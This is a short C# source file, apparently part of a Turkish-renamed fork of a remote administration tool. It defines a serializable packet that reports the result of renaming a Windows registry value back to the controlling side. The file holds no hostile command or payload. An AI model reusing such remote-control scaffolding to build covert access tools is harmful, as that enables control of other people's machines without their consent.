using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetRenameRegistryValueResponse : IPacket
    {
        public string KeyPath { get; set; }
        public string OldValueName { get; set; }
        public string NewValueName { get; set; }

        public bool IsError { get; set; }
        public string ErrorMsg { get; set; }

        public GetRenameRegistryValueResponse() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
